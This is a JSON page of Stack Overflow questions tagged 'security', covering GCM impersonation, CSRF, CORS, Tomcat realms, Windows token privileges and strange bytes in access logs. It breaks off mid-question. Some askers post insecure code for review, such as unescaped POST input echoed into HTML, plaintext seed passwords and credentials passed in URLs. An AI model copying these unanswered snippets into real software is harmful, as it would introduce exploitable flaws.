{"total":17772,"page":1,"pagesize":100,"questions":[{"tags":["android","security","android-c2dm","android-gcm"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":336,"score":0,"question_id":11352583,"title":"google cloud messaging security","body":"<p>Company creates a project and receives a sender ID.  Company creates an app, bakes in its sender ID and places the app in the store.</p>\n\n<p>Attacker reverse engineers the app and extracts both the sender ID and the server interface used to receive GCM registration IDs.</p>\n\n<p>Attacker creates his own app, bakes in Company's sender ID and server registration interface, puts app in the store.  The attack app basically impersonates Company's real app as far as GCM goes:  it registers to receive messages from Company's sender ID and then sends its GCM registration ID to Company's servers just like the \"real\" app does.</p>\n\n<p>Now Company wants to broadcast some information to all instances of its app.  Maybe it's a reminder than an update is available.  Is there any way to differentiate the \"attack app\" (which registered just like the real one) from \"real\" versions of the Company's app?</p>\n"},{"tags":["php","forms","security","captcha","contact"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":276,"score":5,"question_id":11448140,"title":"need some help to add some captcha contact form","body":"<p>Hi I'm new to PHP and I would like some help please. \nI 've created a contact form and i would like to add some captcha. I have created some gif images, that have numbers with some noise added on, and named the code_01.gif for no1, code_02.gif for no2 etc etc. I have put some of them on my form, staticly, for display purposes like this: </p>\n\n<pre><code>&lt;img src=\"images/code_01.gif\" /&gt;\n&lt;img src=\"images/code_07.gif\" /&gt;\n&lt;img src=\"images/code_01.gif\" /&gt;\n&lt;img src=\"images/code_08.gif\" /&gt;\n&lt;img src=\"images/code_03.gif\" /&gt;\n&lt;img src=\"images/code_07.gif\" /&gt;\n&lt;input name=\"captcha\" type=\"text\" id=\"captcha\" /&gt;\n</code></pre>\n\n<p>I would like to add some functionality to display randomly the image codes every time and also check to see if the input matches with the 6 digits that displayed.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["security","url","web-applications","proxy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":10,"score":1,"question_id":13295797,"title":"Using a proxy to detect URL manipulation","body":"<p>Is there a way to use a reverse proxy to prevent URL manipulation attacks?</p>\n"},{"tags":["android","security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13298299,"title":"detecting disk encryption on android","body":"<p>Since Android SDK 3.0, users can choose to encrypt their entire disk which basically amounts to encrypting /data on a given device.  The option is presented in the phone preferences so I assumed it would be available for read by applications.  There's this DevicePolicyManager that looks like it has the information but am I to understand that an app must implement a receiver like <a href=\"http://rootfs.wordpress.com/2010/09/09/android-make-your-application-a-device-administrator/\" rel=\"nofollow\">here</a>?  This doesn't really work for me since I don't want to explicitly manage the user's device and certainly don't want them to have to agree to such a thing for them to install my application.  Is there really not just some flag I can read somewhere to see if it's encrypted?</p>\n"},{"tags":["android","security","configuration"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":39,"score":0,"question_id":13296878,"title":"Possible ways of programmatically/normally securing settings tab on lenovo tablet? (Includes android programs to password protect it)","body":"<p>I would like to secure settings tab on lenovo tablet device with a password. What is a simple way of going about this? Code is welcome too (I think I might need to code but if you think an google play marketplace app would solve my problem please post your suggestion below). </p>\n\n<p>Edit: I have researched and posted on lenovo forums already which I always do before posting here and it takes them a week just for simple question sometimes to respond. \nPlease if iam too vague say so below because -2 does not help me one bit.</p>\n\n<p>Here's more more information for why iam trying to do this:</p>\n\n<p>I work at a K-12 system with high students always testing my wits.\nWithout the password kids/students can add their own account or change settings for the tablet doing things that could hurt the school system legally (download playboy, using the devices to distribute viruses and malware, and the list goes on </p>\n"},{"tags":["web-services","security","ws-security","agent","openam"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4,"score":0,"question_id":13287623,"title":"Enabling Web Service Security With OpenAM WSS Agent","body":"<p>I am struggling with setting up the Web service security with OpenAM.\nHere is what I have done so far:</p>\n\n<ol>\n<li><p>I looked up openam documentation but I could nto find anything\nsignificant which points to web service  security implementation details.</p></li>\n<li><p>However I found this link\n(http://www.oracle.com/technetwork/java/wss-sdn-1-137232.html) on\nOpenSSO oracle website which gives step by step instructions to\n    secure the web services.</p></li>\n<li><p>Also I found this post\n(http://www.stormacq.com/web-services-security-with-opensso-security-token-service-sts/) which essentially says that there are many issues one might face while\ntrying to implement WSS in OpenAM.</p></li>\n<li><p>I followed oracle link (point 2 above) and tried to implement the WSS in OpenAM version 10.0.0:</p></li>\n</ol>\n\n<p>My questions:</p>\n\n<ul>\n<li><p>But The WSS Agent I got from OpenAM website is glassfish version. I am not  sure if extracting it and including files from it in my service and client will cause any issues if the server is not glassfish. OpenAM website has glassfish version only.</p></li>\n<li><p>Another problem is that oracle tutorial was probably written in days of OpenSSO 8.0. Not sure if it will work with Open AM 10. I can see some differences in directory structure already.</p></li>\n<li><p>It will be helpful if anyone can point me to any other available documentation for implementation of WSS in OpenAM.</p></li>\n<li><p>Is it advisable to use some IDM solution other than OpenAM for WSS security if OpenAM WSS has known issues.</p></li>\n</ul>\n\n<p>Any help here will be sincerely appreciated. Thanks in Advance.</p>\n"},{"tags":["php","security","payment-gateway","pci-dss","pci-compliance"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13294355,"title":"SagePay's Direct Integration Or CyberSource's SOAP API Method!! Should I be PCI complaint?","body":"<p>I am currently integrating payment gateway to our merchant page. We are expecting about 100000 to 0.5mil transactions per month on our website. We have SSL certificate on our payment pages. Both SagePay and CyberSource equivalent for maximum payment page customisation are Direct and SOAP API, which let me host the payment pages on my server collect payment informations.</p>\n\n<p>My only worry is I post these payment information to my server before sending it to respective payment gateways. I am not storing it in session or in DB. And all our post URLS are SSL certified. </p>\n\n<p>According to PCI Compliance, If I transmit the payment data from my server I should take PCI audit every year and a security assessor will carry a remote test and a in house test. </p>\n\n<p>Obviously, this is going to be expensive. </p>\n\n<p>Do I need a PCI compliance if I follow the SagePay Direct integration or CyberSource SOAP API documentations?</p>\n\n<p>Sorry to be a pest. I am aware that this question exist through out this community. But I can't see a convincing answer to my particular integration method. </p>\n\n<p>It would be amazing to receive answers from specialist payment security advisers. </p>\n\n<p>Kind Regards,</p>\n"},{"tags":["asp.net-mvc","asp.net-mvc-3","web-services","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13296254,"title":"Will using a master login username and password when implementing web services considered secure","body":"<p>I am working on an asp.net mvc-4 web application and I have started implementing some web services which provides statistical information about my site. But to make sure that only authorized and authenticated consumers can call and consume the web services I am thinking of defining a master login username and password for each consumer, and when a consumer sends a web service request he should include these master login username and password (stored as a hash value ) in the web service calls.</p>\n\n<p>For example the web service link to call specific web service from my web site will look as follow:-</p>\n\n<pre><code>/web/json/statistic/getsummaryinfo/areacode?j_username=masterusername&amp;hash=D012B772672A55A0B561EAA53CA7734E\n</code></pre>\n\n<p><strong>So my question is whether the approach I am following will provide a secure solution to my web services and to the consumers? OR my approach have security holes I am unaware of ?</strong></p>\n\n<p><strong>:::EDITED::</strong></p>\n\n<p>I am using the WebAPI controllers to implement the web services inside my asp.net mvc-4.**</p>\n\n<p>Best Regards</p>\n"},{"tags":["java","security","tomcat","realm"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":13274696,"title":"Tomcat 7 nesting CombinedRealm, LockoutRealm and DataSourceRealm","body":"<p>I'm trying to nest Realms as follows in Tomcat (written here in pseudo-XML):</p>\n\n<pre><code>&lt;CombinedRealm&gt;\n  &lt;LockoutRealm&gt;\n     &lt;DataSourceRealm/&gt;\n  &lt;/LockoutRealm&gt;\n  &lt;UserDatabaseRealm/&gt;\n&lt;/CombinedRealm&gt;\n</code></pre>\n\n<p>This doesn't seem to work - is it possible to nest Realms in Tomcat by more than two levels? I get a warning in the logs: </p>\n\n<pre><code>No rules found matching 'Server/Service/Engine/Realm/Realm/Realm'.\n</code></pre>\n\n<p>The idea behind is that the web service has some critical users that must not be locked out (e.g. as a DOS) and some normal users, which may have weaker passwords, where the lockoutRealm should be active. I'm sure other people have been in this situation.</p>\n\n<p>If there is another way to achieve this (e.g. a whitelist for the LockoutRealm), please let me know.</p>\n\n<p>Single sign on is also needed.</p>\n\n<p>I guess extending the existing LockoutRealm code with a list of accounts never to lock out would be an option, but I'm not so keen on writing my own Realm, I would rather not add custom code on that level to Tomcat, as this will complicate setup for others and with every Tomcat update it might break etc. </p>\n\n<p>Thanks for any help!</p>\n\n<p>Here is the relevant part of server.xml of my test config:</p>\n\n<pre><code>&lt;Engine name=\"Catalina\" defaultHost=\"localhost\"&gt;\n\n  &lt;Realm className=\"org.apache.catalina.realm.CombinedRealm\"&gt;\n\n    &lt;!-- Lockout realm for the DB users --&gt;\n    &lt;Realm className=\"org.apache.catalina.realm.LockOutRealm\"&gt;\n      &lt;!-- PRIMARY: DataSourceRealm with user DB --&gt;\n      &lt;Realm className=\"org.apache.catalina.realm.DataSourceRealm\"\n         dataSourceName=\"jdbc/authority\"\n         userTable=\"user\" userNameCol=\"username\" \n         userCredCol=\"password\" digest=\"SHA\"\n         userRoleTable=\"user_role\" roleNameCol=\"rolename\" /&gt;\n    &lt;/Realm&gt;\n\n    &lt;!-- FALLBACK:\n         This Realm uses the UserDatabase configured in the global JNDI\n         resources under the key \"UserDatabase\".  Any edits\n         that are performed against this UserDatabase are immediately\n         available for use by the Realm.  --&gt;\n    &lt;Realm className=\"org.apache.catalina.realm.UserDatabaseRealm\"\n           resourceName=\"UserDatabase\"/&gt;\n\n  &lt;/Realm&gt;\n\n  &lt;Host name=\"localhost\"  appBase=\"webapps\"\n        unpackWARs=\"true\" autoDeploy=\"true\"&gt;\n\n    &lt;!-- SingleSignOn valve, share authentication between web applications\n         Documentation at: /docs/config/valve.html --&gt;\n    &lt;Valve className=\"org.apache.catalina.authenticator.SingleSignOn\" /&gt;\n\n    &lt;!-- Access log processes all example.\n         Documentation at: /docs/config/valve.html\n         Note: The pattern used is equivalent to using pattern=\"common\" --&gt;\n    &lt;Valve className=\"org.apache.catalina.valves.AccessLogValve\" directory=\"logs\"\n           prefix=\"localhost_access_log.\" suffix=\".txt\"\n           pattern=\"%h %l %u %t &amp;quot;%r&amp;quot; %s %b\" /&gt;\n\n  &lt;/Host&gt;\n&lt;/Engine&gt;\n</code></pre>\n"},{"tags":["spring","security","grails-plugin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13276860,"title":"Sorry, we were not able to find a user with that username and password","body":"<p>I installed the Spring Security core plug-in 1.2.7.3 on Grails 2.1.1, ran the s2-quickstart command, and then initialized the initial user and roles in the bootstrap.groovy, but I still cannot login.  Text of the relevant piece of bootstrap.groovy follows:</p>\n\n<pre><code>    if (SecRole.count == 0) {\n        def fUserRole = SecRole.findByAuthority('ROLE_FlowUser') ?: new SecRole(authority: 'ROLE_FlowUser').save(failOnError: true, flush: true)\n        def fAdminRole = SecRole.findByAuthority('ROLE_FlowAdmin') ?: new SecRole(authority: 'ROLE_FlowAdmin').save(failOnError: true, flush: true)\n\n        def bf = SecUser.findByUsername('bill') ?: new SecUser(\n                username: 'bill',\n                password: 'eagle',\n                firstName: 'bill',\n                lastName: 'fly',\n                email: 'bill.fly@baylorhealth.edu',\n                accountExpired: false,\n                accountLocked: false,\n                passwordExpired: false,\n                enabled: true\n        ).save(failOnError: true, flush: true)\n\n        if (!bf.authorities.contains(fAdminRole)) {\n            SecUserSecRole.create bf, fAdminRole, true\n        }\n        if (!bf.authorities.contains(fUserRole)) {\n            SecUserSecRole.create bf, fUserRole, true\n        }\n    }\n</code></pre>\n\n<p>I am not encrypting the password in bootstrap, as seems to be the answer to most of the questions of this type.  All four records are getting written to the database tables, but of course, I cannot tell if the password is encrypted correctly.  My initial controller has the following annotation ahead of the class statement:\n@Secured(['IS_AUTHENTICATED_FULLY'])</p>\n\n<p>Also, I added the following to the config.groovy:</p>\n\n<p>// Added by the Spring Security Core plugin:\ngrails.plugins.springsecurity.userLookup.userDomainClassName = 'cocktail.SecUser'\ngrails.plugins.springsecurity.userLookup.authorityJoinClassName = 'cocktail.SecUserSecRole'\ngrails.plugins.springsecurity.authority.className = 'cocktail.SecRole'\ngrails.plugins.springsecurity.password.algorithm = 'SHA-256'</p>\n"},{"tags":["php","security","codeigniter","xss-prevention"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13291336,"title":"Should I use xss_clean or htmlentities during form refill?","body":"<p>As the title says, I do refill my input like this:</p>\n\n<pre><code>&lt;input type=\"text\" name=\"my_input\" value=\"&lt;?= $this-&gt;input-&gt;post('my_input') ?&gt;\"/&gt;\n</code></pre>\n\n<p>But is that safe? In accordance with CodeIgniter user guide, I can set the second parameter of the <code>$this-&gt;input-&gt;post()</code> to the <code>TRUE</code> and then the input will be filtered trough the <code>xss_clean</code> function, but is it really necessary? Or maybe I should just use <code>htmlentities()</code> function while doing that?</p>\n"},{"tags":["security","spring","plugins","grails"],"answer_count":2,"favorite_count":6,"up_vote_count":3,"down_vote_count":0,"view_count":930,"score":3,"question_id":6409548,"title":"Grails Spring Security plugin - modify logged in user's authorities","body":"<p>I have a simple Grails app with Spring Security Core plugin installed and working fine. However, I haven't found any solution to the problem with updating a logged in user's authorities in the security context. I am not talking about updating the current user's details (i.e. springSecurityService.reauthenticate).</p>\n\n<p>My problem is: I have a simple user management app with ROLE_ADMIN and ROLE_USER authorities used. Now, I have 2 administrators logged in at the same time (with ROLE_ADMIN authority) from different computers, and one admin decides to change the other admin's authority from ROLE_ADMIN to ROLE_USER.</p>\n\n<p>How can I update the user and role so that the modified user (with new ROLE_USER role) cannot perform any ROLE_ADMIN level actions and is immediately redirected to ROLE_USER level pages? Is there a way to update the security context so I don't have to do additional checking in all the controller actions whether the logged in user's authorities have been changed? Can I use the cahceUsers property for that somehow? I haven't modified the cacheUsers and in my understanding, it's false by default. Please, correct me if I'm wrong.</p>\n\n<p>EDIT: \nThe sequence that's causing the problem is </p>\n\n<ol>\n<li><p>Administrator \"A\" modifies administrator \"B\" and sets a new role (ROLE_USER) for administrator \"B\"</p></li>\n<li><p>the code calls <code>PersonRole.removeAll(personInstanceB) and\nPersonRole.create(personInstanceB, roleAdmin)</code> and everything is updated normally</p></li>\n<li><p>at the same time Administrator \"B\" is already logged in when their authorities are modified. Administrator \"B\" can continue working on ROLE_ADMIN restricted pages until he/she logs out and does a new login. Only then the authorities are updated and Administrator \"B\" has the new role (ROLE_USER) </p></li>\n<li><p>I want Administrator \"B\" to be redirected to the ROLE_USER pages when the user is updated with the new role and not only after logout/login </p></li>\n<li><p>calling <code>springSecurityService.reauthenticate personInstanceB.username)</code> causes Administrator \"A\" to be \"logged in\" as Administrator \"B\" so this does not work.</p></li>\n</ol>\n\n<p>Any ideas would be very welcome. I may have missed something simple here but I have no idea what the solution would be.</p>\n\n<p>Cheers,\nmizzzto</p>\n"},{"tags":["ruby-on-rails","security","cors"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13242049,"title":"Security for cross-origin resource sharing","body":"<p>I have 2 ruby on rails app sitting on 2 different domains (say <em><code>www.exampleA.com</code></em> and <em><code>www.exampleB.com</code></em>. I want to share resources between the 2 apps and I'm using CORS:</p>\n\n<p><em><code>exampleA.com</code></em> sends http POST request to <em><code>exampleB.com</code></em>. </p>\n\n<p>At <em><code>exampleB.com</code></em> I'm checking <code>request.env['HTTP_ORIGIN']</code> to make sure that the request comes from <em><code>exampleA.com</code></em>. If true I respond by setting the response headers to allow the http post request.</p>\n\n<p>My question is can I use <code>request.env['HTTP_ORIGIN']</code> as the only check to verify the identity of requester? </p>\n\n<p>Is it possible for someone from <em><code>www.exampleC.com</code></em> to fake their HTTP_ORIGIN to look like <em><code>www.exampleA.com</code></em> and post malicious data? If so what's the best way to verify requester identity?</p>\n"},{"tags":["security","firefox","browser","firefox-addon","kiosk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":612,"score":1,"question_id":7855452,"title":"How to disable closing Firefox 7 tab using ctrl+F4","body":"<p>I have been browsing around to find a way to disable closing Firefox 7 tab using <code>ctrl+F4</code>.<br>\nKind of hard to find an easy way to do it. Lock down browser security will help me using  Firefox as a kiosk during the Linux Day event.</p>\n"},{"tags":["php","security","projects-and-solutions","tips-and-tricks"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13291018,"title":"CSRF tips and solution","body":"<p>So, I have made a class that inserts automatically in all forms an: <code>&lt;input type=\"hidden\" name=\"csrf\" value=\"csrf_value_uniq_id\" /&gt;</code></p>\n\n<p>Now my problems is that, I set the key to expire after 5 minutes, but if you stay on the page or you go to eat when you come back and you submit the form the csrf keys won't match.</p>\n\n<p>Now, I could set this to expire in 24hours but then I don't know if this will be as safe as is meant to do.I'm using it on post forms.</p>\n\n<p>So what's the best solution how should I do this?</p>\n"},{"tags":["security","file-io","html5","filesystems"],"answer_count":2,"favorite_count":5,"up_vote_count":19,"down_vote_count":0,"view_count":7934,"score":19,"question_id":2376745,"title":"Does HTML5 allow you to interact with local client files from within a browser","body":"<p>I've seen some posts regarding access to files on a client machine by a webpage, namely this <a href=\"http://stackoverflow.com/questions/292566/browser-application-local-file-system-access\">question</a>. </p>\n\n<p>I'm trying to hop on the \"continuously update in the cloud\" paradigm for some algorithms I am writing so my users can access the latest versions by simply accessing the webpage. This requires that the program/webpage can start with a directory and recursively inspect files within it and compute results based on what is found. In the end it also should be able to write the results file to the client's filesystem.</p>\n\n<p>One of the answers in that previous question mentions Google Gears but that has since been discontinued in favor of HTML5.\nIs access to a client directory possible within HTML5? How?</p>\n\n<p>I know why access by any webpage to local files is a security risk, but for my purpose I have no problem to ask the user for the appropriate permissions.</p>\n"},{"tags":["c#","security","token","information","privilege"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13293932,"title":"Privileges of an Application","body":"<p>Is there a way to get the privileges associated with a C# program?  If yes, how?</p>\n\n<p>I know that in C, you have to create a token and make use of the GetTokenInformation() method to get information about the token.</p>\n\n<p>Is there something similar in C#?</p>\n"},{"tags":["security","encoding","character-encoding"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":537,"score":1,"question_id":5202901,"title":"Who can decode this code?","body":"<p>Here are a few samples of strange code I see in our access logs. Can anyone decode this?</p>\n\n<p>For example:</p>\n\n<pre><code>\\xb3\\xe1\\xdd=H\\t\\xd5\\xd2\\xf0ml\\xf1\\x10\\xee/\\xa0$\\xeaY\\xa5\\xe7\\x81d \\xd5\\x1f\\xd9 QI\\xd9\\'\\xfb4I\\xb8\\xf3\\x1d0:\\xb5i\\x18Q\\x02\\xa5\\x10$\\xdd\\xcf\\xfa\\xc2\\xfa\\x15\\xd0\\xa8\\xa5\\xfc\\xb2\\xda\\xb9\\x9bA_\\x89\\xc4~\\x0e\\x0ebg*&gt;\\x18\\x12\\x9aniA\\xf6\\xfc\\x85%]\\x1d\\xa6\\x16\\xfe\\x96\\x13\\xe1\\xd8\\xb2\\xf3i~\\xde\\xec6\\xdbgW\\xc3c\\xac2\\x7f\\x9f&amp;\\xa5\\xce\\x14B8~8\\xbe\\xff1\\xa8\\xe6\\x9a\\x9d\\xf7 \\x14\\x10\\x9d\\xce\\xda\\x06\\x93r\\xe7\\x86\\x98\\xa1\\x85^\\xfa\\x93\\xf1\\x94G\\x95\\xc0\\x1b\\xc9\\x81\\xcb&lt;\\x04/\\x836E\\x85\\xbd\\xae%\\x07D\\xe9j\\x80\\x7f=\\xccWW\\x04.\\xbe\\x0f\\xb6\\x8c\n</code></pre>\n\n<p>Now, if we leave out all the unreadable characters we get:</p>\n\n<pre><code>=H\\tml/$Yd  QI'4I0:iQ$A_~bg*&gt;niA%]i~6gWc2&amp;B8~81 r^G&lt;/6E%Dj=WW.\n</code></pre>\n\n<p>The \"H\\tml\" part in the beginning could suggest that the code above contains some HTML code, or it may just be a coincidence?</p>\n\n<p>Here are a few more samples:</p>\n\n<pre><code>\\xbdl\\x1cq\\x1e\\xf65\\xe3@3\\xd8E\\xa8\\xf7\\xc0e\\x10\\xfe\\x15\\xbfzhap\\xff\\xe6i\\x9cq\\xe3bGm\\x81DWQ\\xf5\\x94\\xbav~\\\\\\xaa\\xd0\\xed\\xdfl\\x028\\x1d\\xcds\\x07H\\x02\\x04\\xf2\\x8fU\\xe0\\xd6x,\\x9f\\x98)\\xe8\\x1c \\xc7\\xdd\\xd7\\xea\\xd0\\x12h^\\xb4\\xd0\\x85G\\xdb\\xe4 \\xe6\\xabYM\\xf36\\\"&lt;\\xb6\\x1e\\xeak]\\x93\\xc2D\\xfa\\xc4\\xe9\\xa93,b\\xf5\\x80\\x15\\x92L5\\x02\\xc3GY\\xa7k\\x7f\\xa2\\xfd}\\xa2%+\\x14\\xf5\\xe8\\x95\\x1f\\xe2\\xef\\xd41\n\nst|]%Y\\xbf\\xeaj\\xe9&lt;z\\xbb\\xfb\\xe76\\xbbf&gt;\\xe9\\x1dU{\\xaf\\x97\\x1b\\x9e\\xf3&amp;\\x9b\\x87t{\\xf3O0\\x8c`TQ\\xdc\\xbd.\\xee\\xff\\x9cEG\\xabU\\xc5 \\xfc[\\xe0\\x0f\\xa5jK\\x85\\x92\\xb2\\x90\\x96E\\xba\\x9c\\x9c\\xa5\\xccA`\\v\\xa0\\xd7&gt;3\\t\\x89u\\x11\\x817\\xa5\\xb2\\x83\\xfa\\x89A\\x14\\x07\\xe1\\xc4&gt;\\\"\\xb4\\x02m\\xe4\\x9eZ\\x9b&gt;\\xb0\\xe5\\x9c\\x15\\xa0p\\xado:\\xb4\\x1d\\x1a\\xb7\\xb1\\x1c\\x0f\\xa3\\xadz-\\xdc\\xb5q\\xb9\\xfc\\xb95g\\xb8\\xa8 \\xd2t\\xa3\\x90\\xe7N\\xa7e \\x15I\\xe6\\x1b\\xdbNB5\\xfa3\\xed\\xfdG\\t\\x19(\\xe1\\x9f\n\nwo\\x01\\xb9\\x98\\xa6q.\\x0c&amp;\\xba\\x1dnXN\\xce\\xb7\\xd3\\x99\\xfd\\x12&gt;*\\xa5\\x89\\xc9\\xb2 lQ\\x89\\xcc\\x9f\\x113+\\xb5\\xc4\\x86\\xb6g\\x97\\x15]\\x98g\\xc1\\xa1\\xa8\\xfeK\\x03\\xb5w\\xe4\\xf8&amp;\\xc8`1\\x8c\\x1c\\x88\\x82\\xc2]\\x8d&amp;\\xbc\\x8cU&amp;4\\xc5[jS \\xb0\\xed\\xf7m{\\x95i\n\n\\xbdl\\x1cq\\x1e\\xf65\\xe3@3\\xd8E\\xa8\\xf7\\xc0e\\x10\\xfe\\x15\\xbfzhap\\xff\\xe6i\\x9cq\\xe3bGm\\x81DWQ\\xf5\\x94\\xbav~\\\\\\xaa\\xd0\\xed\\xdfl\\x028\\x1d\\xcds\\x07H\\x02\\x04\\xf2\\x8fU\\xe0\\xd6x,\\x9f\\x98)\\xe8\\x1c \\xc7\\xdd\\xd7\\xea\\xd0\\x12h^\\xb4\\xd0\\x85G\\xdb\\xe4 \\xe6\\xabYM\\xf36\\\"&lt;\\xb6\\x1e\\xeak]\\x93\\xc2D\\xfa\\xc4\\xe9\\xa93,b\\xf5\\x80\\x15\\x92L5\\x02\\xc3GY\\xa7k\\x7f\\xa2\\xfd}\\xa2%+\\x14\\xf5\\xe8\\x95\\x1f\\xe2\\xef\\xd41\n</code></pre>\n\n<p>We see such codes often in the logs. Like millions times a day. Makes me very curious about its contents :))</p>\n\n<p>(more) code also available via <a href=\"http://pastebin.com/ZcXM5NHs\" rel=\"nofollow\">http://pastebin.com/ZcXM5NHs</a></p>\n"},{"tags":["security","elasticsearch"],"answer_count":2,"favorite_count":6,"up_vote_count":7,"down_vote_count":3,"view_count":2639,"score":4,"question_id":4960298,"title":"How to secure an Internet-facing Elastic Search implementation in a shared hosting environment?","body":"<p>I've been going over the documentation for <a href=\"http://www.elasticsearch.org/\" rel=\"nofollow\">Elastic Search</a> and I'm a <em>big</em> fan and I'd like to use it to handle the search for my ASP.NET MVC app.</p>\n\n<p>That introduces a few interesting twists, however.  If the ASP.NET MVC application was on a dedicated machine, it would be simple to spool up an instance of Elastic Search and use the <a href=\"http://www.elasticsearch.org/guide/reference/modules/transport.html\" rel=\"nofollow\">TCP Transport</a> to connect locally.</p>\n\n<p>However, I'm not on a dedicated machine for the ASP.NET MVC application, nor does it look like I'll move to one anytime soon.</p>\n\n<p>That leaves hosting Elastic Search on another machine (in the *NIX world) and I would probably go with shared hosting there.</p>\n\n<p>One of the biggest things lacking from Elastic Search, however, is the fact that it doesn't support HTTPS and basic authentication out of the box.  If it did, then this question wouldn't exist; I'd simply host it somewhere and make sure to have an incredibly secure password and HTTPS enabled (possibly with a self-signed certificate).</p>\n\n<p>But that's not the case.</p>\n\n<p>That given, what is a good way to expose Elastic Search over the Internet in a secure way?</p>\n\n<p>Note, I'm looking for something that hopefully, will not require writing code to provide shims for the methods that I want (in other words, writing forwarders).</p>\n"},{"tags":["c","security","token","information"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13292424,"title":"C - Buffer printing rubbish characters when getting token information","body":"<p>I have the following code snippet written in C which is supposed to retrieve token information about the program privileges:</p>\n\n<pre><code>char buffer[1000]; //Declaring the buffer where the token information will be stored\nint size = sizeof(buffer); //Storing the size of the buffer\nDWORD required_size; //A variable storing return information from the GetTokenInformation() method\n\nHANDLE process = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId()); //Opening the current process\nHANDLE token; //Creating a handle for the token\nOpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES, &amp;token); //Opening the process token\n\nGetTokenInformation(token, TokenPrivileges, buffer, size, &amp;required_size); //Obtaining the token information\nprintf(\"The following information was obtained with regards to the token privileges: \\n\\n\");\nprintf(\"%s\\n\\n\", buffer);\n</code></pre>\n\n<p>The main problem is that when I try to print the contents of 'buffer', only rubbish information is printed on the screen :s  How can I solve this please?</p>\n"},{"tags":["javascript","security","user-agent","privacy","chrome-ios"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12180224,"title":"Unique tab ID appended to user agent string in Chrome for iOS?","body":"<p>As I was testing my web app in Chrome for iOS (both iPhone and iPad), I noticed a weird ID appended to user agent string, e.g.:</p>\n\n<pre><code>    alert(navigator.userAgent)\n</code></pre>\n\n<p>would produce something like this (note the \"3810AC74-327F-43D7-A905-597FF9FDFEAB\" part at the end):</p>\n\n<pre><code>    Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X; en-us) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/21.0.1180.77 Mobile/9B206 Safari/7534.48.3 (3810AC74-327F-43D7-A905-597FF9FDFEAB)\n</code></pre>\n\n<p>This ID seems to be tab specific and persists even when going to a different site.</p>\n\n<p>My question is, if anyone knows anything about this and what it may be used for?</p>\n\n<p><strong>Please <a href=\"http://hexcollective.co.uk/tests/user-agent/\" rel=\"nofollow\">go to the test page</a>  to see what I am talking about.</strong></p>\n"},{"tags":["c","windows","security","winapi","token"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13292043,"title":"Getting Token Information","body":"<p>I have the following program written in C:</p>\n\n<pre><code>#include \"stdafx.h\"\n#include &lt;Windows.h&gt;\n\nvoid main()\n{\n    char buffer[1000];\n    int size = sizeof(buffer);\n    PDWORD required_size;\n\n    printf(\"----Application Privileges----\\n\\n\");\n    printf(\"In this program, we are going to obtain information about the application privileges\\n\\n\");\n\n    HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId()); //Opening the current process\n    HANDLE token; //Creating a handle for the token\n    OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES, &amp;token); //Opening the process token\n\n    GetTokenInformation(token, TokenPrivileges, buffer, size, required_size); //Obtaining the token information\n    printf(\"The following information was obtained with regards to the token privileges: \\n\\n\");\n    printf(\"%s\\n\\n\", buffer);\n\n    printf(\"Press enter to exit the program\");\n    getchar();\n\n}\n</code></pre>\n\n<p>Now, I am relatively new to the use of tokens.  When I try to execute the program, the following error comes up:</p>\n\n<blockquote>\n  <p>Run-Time Check Failure #3 - The variable 'required_size' is being used without being initialized.</p>\n</blockquote>\n\n<p>How can I solve this problem please?  What I want to do is to display information about the token privileges of the current process to the user.</p>\n\n<p>I don't know exactly what the last variable (ReturnLength [out]) in the GetTokenInformation method does.  I tried reading the msdn documentation but did not understand its use.</p>\n"},{"tags":["security","logic","checkout"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13291726,"title":"Is my credit card page secure? Safeguard inquiry","body":"<p>https: xyz dot com/authenticate/cc.php</p>\n\n<p>This is the page 3 of my registration....where my members enter their credit card. This is tied into my authorize.net account.</p>\n\n<p>One thing i noticed recently is this page can be accessed on its own just by typing in the URL.. there is no required pre-url that leads up to it. This seems unsafe, but regardless if someone wanted to abuse it they could just go through the registration process and keep submitting incorrect CC numbers.. costing me money right?</p>\n\n<p>I dont remember if we put an IP limit on it, or again if that is even 100% safeguard. \nI am pretty sure we did something where if they enter mastercard with their number(temporarily stored) and it gets sent back as invalid it will match that and not allow them to keep entering the wrong 16 digit number.\nShould i just leave the page accessible without specific pages allowing access and worrying about IP limits instead? Couldn't someone just keep switching their ip and submitting this page with incorrect CC's or fake ones at 